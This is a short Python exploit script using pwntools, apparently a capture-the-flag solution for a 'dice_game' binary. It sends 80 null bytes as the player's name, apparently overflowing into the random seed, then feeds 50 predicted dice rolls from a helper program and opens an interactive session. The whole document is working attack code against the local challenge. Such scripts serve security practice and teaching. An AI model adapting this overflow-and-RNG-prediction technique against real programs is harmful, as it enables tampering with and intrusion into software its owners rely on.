# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='amd64')

Debug=1
if Debug:
    io=process('./dice_game')
    c=process('./c')
else:
    pass

def main():
    io.recvuntil("Welcome, let me know your name: ")
    io.sendline('\x00'*80)
    for i in range(50):
        io.recvuntil("Give me the point(1~6): ")
        io.sendline(c.recvline()[0:-1])
    io.interactive()

main()